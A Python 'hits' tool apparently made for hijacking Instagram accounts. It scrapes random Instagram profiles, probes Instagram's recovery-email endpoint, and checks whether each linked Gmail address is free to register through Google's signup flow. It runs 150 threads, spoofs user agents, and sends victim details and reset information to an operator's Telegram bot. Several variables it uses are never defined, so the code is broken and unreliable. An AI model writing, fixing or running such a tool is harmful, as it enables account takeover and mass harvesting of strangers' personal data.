import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
import threading
from datetime import datetime
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render
from colorama import Fore, Style, init
import webbrowser

init(autoreset=True)


EXPIRE_TIME = '2025-11-22 19:59:00'
EXPIRE_MSG = '   contact @jaorg'

def check_expiration():
    current_time = datetime.now()
    expiration_time = datetime.strptime(EXPIRE_TIME, '%Y-%m-%d %H:%M:%S')
    if current_time > expiration_time:
        print(EXPIRE_MSG)
        sys.exit(1)

check_expiration()


NAGI_CONFIG = {
    "api_endpoint": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
    "signature_version": "signature_version",
    "encoded_payload": "encoded_payload",
    "session_cookie": "mid=YWRmMwABAAFVn7T8J9pLxw3qKd; csrftoken=Ax8Yq2LpNvRcDzWf96BMjiXKLNCVst",
    "header_content_type": "Content-Type",
    "header_cookie": "Cookie",
    "header_user_agent": "User-Agent",
    "default_ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "google_auth_url": "https://accounts.google.com",
    "google_auth_domain": "accounts.google.com",
    "header_referer": "referer",
    "header_origin": "origin",
    "header_authority": "authority",
    "content_form_type": "application/x-www-form-urlencoded; charset=UTF-8",
    "content_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
    "auth_token_file": "auth_tokens.txt",
    "email_suffix": "@gmail.com"
}


NAGI_COLORS = {
    'orange1': '\033[38;5;202m',
    'orange2': '\033[38;5;203m',
    'orange3': '\033[38;5;204m',
    'orange4': '\033[38;5;205m',
    'orange5': '\033[38;5;206m',
    'orange6': '\033[38;5;207m',
    'green': '\x1b[38;5;48m',
    'white': '\033[38;5;15m',
    'cyan': '\033[38;5;39m',
    'pink': '\033[38;5;203m',
    'bright_green': '\033[38;5;46m',
    'gray': '\033[38;5;248m',
    'yellow1': '\033[38;5;226m',
    'yellow2': '\033[38;5;227m',
    'yellow3': '\033[38;5;228m',
    'yellow4': '\033[38;5;229m',
    'yellow5': '\033[38;5;230m',
    'yellow6': '\033[38;5;231m'
}


stats = {
    'total_hits': 0,
    'hits': 0,
    'bad_instagram': 0,
    'bad_email': 0,
    'good_instagram': 0
}


user_data_cache = {}


http_client = requests.Session()


print('✦✧✧' * 14)
nagi = render('SENPAI', font='block', colors=['white', 'blue'], align='center', background='black', space=True)
print(nagi)
print("tool by @jaorg | @senpai_era | crdt: @nagipy")
print('✧✧✦' * 14)


TELEGRAM_ID = input(f"\033[1;90m𖤍  \033[1;97mTelegram Id \033[1;90m☞  ")
BOT_TOKEN = input(f"\033[1;90m𖤍  \033[1;97mBot Token \033[1;90m  ☞ ")
os.system('clear')

def display_statistics():
    
    hits_count = stats['hits']
    bad_count = stats['bad_instagram'] + stats['bad_email']
    good_count = stats['good_instagram']

    os.system('clear')
    print(f"{NAGI_COLORS['yellow1']}𖤍 丂𝐞𝐧𝐩𝐚𝐢 ♨︎")
    print(f"{NAGI_COLORS['yellow1']}• 𝖍𝖎𝖙𝖘     ➸  {NAGI_COLORS['yellow2']}{hits_count}")
    print(f"{NAGI_COLORS['yellow1']}• 𝖇𝖆𝖉 𝖍𝖎𝖙𝖘     ➸ {NAGI_COLORS['yellow3']}{bad_count}")
    print(f"{NAGI_COLORS['yellow1']}• 𝖌𝖔𝖔𝖉 𝖎𝖌     ➸ {NAGI_COLORS['yellow4']}{good_count}")

def update_stats_display():
  
    display_statistics()

def create_auth_token():
    
    try:
        chars = 'azertyuiopmlkjhgfdsqwxcvbn'
        name_segment1 = ''.join(choice(chars) for _ in range(randrange(6, 9)))
        name_segment2 = ''.join(choice(chars) for _ in range(randrange(3, 9)))
        session_id = ''.join(choice(chars) for _ in range(randrange(15, 30)))
        
        auth_headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            NAGI_CONFIG["header_content_type"]: NAGI_CONFIG["content_form_alt"],
            'google-accounts-xsrf': '1',
            NAGI_CONFIG["header_user_agent"]: str(generate_user_agent())
        }
        
        recovery_endpoint = f"{NAGI_CONFIG['google_auth_url']}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-US"
        response = requests.get(recovery_endpoint, headers=auth_headers)
        
        pattern_match = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            response.text
        )
        
        if pattern_match:
            auth_token = pattern_match.group(2)
        else:
            raise Exception("Auth token not found")
        
        session_cookies = {'__Host-GAPS': session_id}
        request_headers = {
            NAGI_CONFIG["header_authority"]: NAGI_CONFIG["google_auth_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.8',
            NAGI_CONFIG["header_content_type"]: NAGI_CONFIG["content_form_alt"],
            'google-accounts-xsrf': '1',
            NAGI_CONFIG["header_origin"]: NAGI_CONFIG["google_auth_url"],
            NAGI_CONFIG["header_referer"]: 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&NAGI=mn',
            NAGI_CONFIG["header_user_agent"]: generate_user_agent()
        }
        
        payload = {
            'f.req': f'["{auth_token}","{name_segment1}","{name_segment2}","{name_segment1}","{name_segment2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"US",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        
        response = requests.post(f"{NAGI_CONFIG['google_auth_url']}/_/signup/validatepersonaldetails",
                               cookies=session_cookies, headers=request_headers, data=payload)
        token_string = str(response.text).split('",null,"')[1].split('"')[0]
        session_id = response.cookies.get_dict().get('__Host-GAPS', session_id)
        
        with open(NAGI_CONFIG["auth_token_file"], 'w') as f:
            f.write(f"{token_string}//{session_id}\n")
            
    except Exception as e:
        create_auth_token()


create_auth_token()

def verify_email_availability(email_address):
    
    global tracking_stats
    try:
        if '@' in email_address:
            email_address = email_address.split('@')[0]
            
        with open(NAGI_CONFIG["auth_token_file"], 'r') as f:
            token_info = f.read().splitlines()[0]
            
        auth_token, session_id = token_info.split('//')
        session_cookies = {'__Host-GAPS': session_id}
        
        request_headers = {
            NAGI_CONFIG["header_authority"]: NAGI_CONFIG["google_auth_domain"],
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            NAGI_CONFIG["header_content_type"]: NAGI_CONFIG["content_form_alt"],
            'google-accounts-xsrf': '1',
            NAGI_CONFIG["header_origin"]: NAGI_CONFIG["google_auth_url"],
            NAGI_CONFIG["header_referer"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={auth_token}",
            NAGI_CONFIG["header_user_agent"]: generate_user_agent()
        }
        
        query_params = {'TL': auth_token}
        payload_data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&NAGI=mn"
                f"&f.req=%5B%22TL%3A{auth_token}%22%2C%22{email_address}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22US%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        
        response = pp(f"{NAGI_CONFIG['google_auth_url']}/_/signup/usernameavailability",
                    params=query_params, cookies=session_cookies, headers=request_headers, data=payload_data)
        
        if '"gf.uar",1' in response.text:
            tracking_stats['valid_accounts'] += 1
            update_stats_display()
            full_email = email_address + NAGI_CONFIG["email_suffix"]
            save_user_info(email_address, full_email.split('@')[1])
        else:
            tracking_stats['invalid_email'] += 1
            update_stats_display()
            
    except Exception as e:
        pass

def check_instagram_profile(email_address):
    
    global tracking_stats
    user_agent_string = generate_user_agent()
    device_id_string = 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    unique_id_string = str(uuid.uuid4())
    
    request_headers = {
        NAGI_CONFIG["header_user_agent"]: user_agent_string,
        NAGI_CONFIG["header_cookie"]: NAGI_CONFIG["session_cookie"],
        NAGI_CONFIG["header_content_type"]: NAGI_CONFIG["content_form_type"]
    }
    
    payload_data = {
        NAGI_CONFIG["encoded_payload"]: (
            '7f3a8c1e5d2b9a4f6c8e0d3b5a9c2f1e.' +
            json.dumps({
                '_csrftoken': 'Ax8Yq2LpNvRcDzWf96BMjiXKLNCVst',
                'adid': unique_id_string,
                'guid': unique_id_string,
                'device_id': device_id_string,
                'query': email_address
            })
        ),
        NAGI_CONFIG["signature_version"]: '5'
    }
    
    response = http_client.post(NAGI_CONFIG["api_endpoint"], headers=request_headers, data=payload_data).text
    
    if email_address in response:
        if NAGI_CONFIG["email_suffix"] in email_address:
            verify_email_availability(email_address)
        tracking_stats['active_ig'] += 1
        update_stats_display()
    else:
        tracking_stats['invalid_ig'] += 1
        update_stats_display()

def get_password_reset_info(username):

    try:
        request_headers = {
            'X-Pigeon-Session-Id': '88dd1923-45ab-78cd-90ef-a1b2c3d4e5f6',
            'X-Pigeon-Rawclienttime': '1701252674.125',
            'X-IG-Connection-Speed': '2500kbps',
            'X-IG-Bandwidth-Speed-KBPS': '1250.500',
            'X-IG-Bandwidth-TotalBytes-B': '1024',
            'X-IG-Bandwidth-TotalTime-MS': '500',
            'X-Bloks-Version-Id': 'd90e7f6c5b4a3c2d1e8f9a0b7c6d5e4f',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '4brTvw8=',
            'X-IG-App-ID': '567067343352427',
            NAGI_CONFIG["header_user_agent"]: 'Instagram 210.0.0.25.120 Android (31/12; 480dpi; 1080x2400; samsung; SM-G998B; y20s; snapdragon885; en_US; 364856214)',
            'Accept-Language': 'en-US, en-GB',
            NAGI_CONFIG["header_cookie"]: NAGI_CONFIG["session_cookie"],
            NAGI_CONFIG["header_content_type"]: NAGI_CONFIG["content_form_type"],
            'Accept-Encoding': 'gzip, deflate, br',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '420'
        }
        
        payload_data = {
            NAGI_CONFIG["encoded_payload"]: (
                '7f3a8c1e5d2b9a4f6c8e0d3b5a9c2f1e.' +
                '{"_csrftoken":"Ax8Yq2LpNvRcDzWf96BMjiXKLNCVst",'
                '"adid":"a1b2c3d4-5678-90ef-ghij-k1l2m3n4o5p6",'
                '"guid":"b2c3d4e5-6789-01fg-hijk-l3m4n5o6p7q8",'
                '"device_id":"android-a1b2c3d4e5f67890",'
                '"query":"' + username + '"}'
            ),
            NAGI_CONFIG["signature_version"]: '5'
        }
        
        response = http_client.post(NAGI_CONFIG["api_endpoint"], headers=request_headers, data=payload_data).json()
        return response.get('email', 'no reset available')
        
    except Exception as e:
        return 'no reset available'

def save_user_info(username, domain):
    
    global tracking_stats
    user_info = user_data_cache.get(username, {})
    user_id_value = user_info.get('pk', 0)
    
    try:
        user_id_int = int(user_id_value)
    except:
        user_id_int = 0

    
    if 1 < user_id_int <= 1278889:
        creation_year = 2010
    elif 1279000 <= user_id_int <= 17750000:
        creation_year = 2011
    elif 17750001 <= user_id_int <= 279760000:
        creation_year = 2012
    elif 279760001 <= user_id_int <= 900990000:
        creation_year = 2013
    elif 900990001 <= user_id_int <= 1629010000:
        creation_year = 2014
    elif 1629010001 <= user_id_int <= 2369359761:
        creation_year = 2015
    elif 2369359762 <= user_id_int <= 4239516754:
        creation_year = 2016
    elif 4239516755 <= user_id_int <= 6345108209:
        creation_year = 2017
    elif 6345108210 <= user_id_int <= 10016232395:
        creation_year = 2018
    elif 10016232396 <= user_id_int <= 27238602159:
        creation_year = 2019
    elif 27238602160 <= user_id_int <= 43464475395:
        creation_year = 2020
    elif 43464475396 <= user_id_int <= 50289297647:
        creation_year = 2021
    elif 50289297648 <= user_id_int <= 57464707082:
        creation_year = 2022
    elif 57464707083 <= user_id_int <= 63313426938:
        creation_year = 2023
    else:
        creation_year = "2024 or 2025"

    follower_count = user_info.get('follower_count', 0)
    try:
        follower_count = int(follower_count)
    except:
        follower_count = 0
        
    if follower_count < 0:
        return

    following_count = user_info.get('following_count', '')
    tracking_stats['total_found'] += 1
    
   
    result_output = f"""
█▀▀ SENPAI 👑⚡ ▀▀█
╔═════════════ 💜 𝐒𝐄𝐍𝐏𝐀𝐈 𝐄𝐑𝐀 💜 ═════════════╗

  🔥 𝐇𝐈𝐓𝐒          : {stats['total_hits']}
  👤 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄     : {username}
  📩 𝐄𝐌𝐀𝐈𝐋         : {username}@{domain}
  👥 𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒    : {followers}
  👣 𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆    : {following}
  🗓️ 𝐘𝐄𝐀𝐑          : {reg_date}
  📝 𝐁𝐈𝐎           : {account_info.get('biography','')}
  🔑 𝐑𝐄𝐒𝐄𝐓 𝐋𝐈𝐍𝐊   : {get_reset_link_info(username)}
  🔗 𝐈𝐆 𝐋𝐈𝐍𝐊       : www.instagram.com/{username}

╚══════════════════════════════════════════════╝
  ⚔️ 𝐂𝐎𝐃𝐄𝐃 𝐁𝐘 @jaorg • 𝐓𝐄𝐀𝐌 @senpai_era ⚔️
█▄▄ SENPAI 👑⚡ ▄▄█
"""
    
    
    with open('nagi_results.txt', 'a') as f:
        f.write(result_output + "\n")
    
    
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_API_KEY}/sendMessage?chat_id={TELEGRAM_USER}&text={result_output}")
    except Exception as e:
        pass

def nagipy():
    
    while True:
        payload = {
            'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=36)),
            'variables': json.dumps({
                'id': int(random.randrange(1629010000, 2369359761)),
                'render_surface': 'PROFILE_VIEW'
            }),
            'doc_id': '35628372952261951'
        }
        
        headers = {'X-FB-LSD': payload['lsd']}
        
        try:
            response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=payload)
            user_data = response.json().get('data', {}).get('user', {})
            username_found = user_data.get('username')
            
            if username_found:
                follower_count = user_data.get('follower_count', 0)
                if follower_count < 20:
                    continue
                    
                user_data_cache[username_found] = user_data
                email_address = username_found + NAGI_CONFIG["email_suffix"]
                check_instagram_profile(email_address)
                
        except Exception as e:
            pass

def stats_update_loop():
    
    while True:
        update_stats_display()
        time.sleep(1)


threading.Thread(target=stats_update_loop, daemon=True).start()


for _ in range(150):
    threading.Thread(target=nagipy).start()
    
    #NAGI by @nagipy Give him credit
